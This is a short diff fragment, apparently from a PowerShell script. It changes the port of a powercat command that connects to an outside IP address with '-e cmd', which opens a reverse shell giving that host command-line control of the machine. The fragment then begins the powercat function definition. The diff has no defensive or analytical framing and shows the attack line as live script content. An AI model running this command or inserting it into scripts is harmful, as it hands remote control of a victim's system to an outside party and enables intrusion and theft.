@@ -1,4 +1,4 @@
-powercat -c 116.203.124.222 -p 5511 -e cmd;
+powercat -c 116.203.124.222 -p 5512 -e cmd;
 
 function powercat
 {
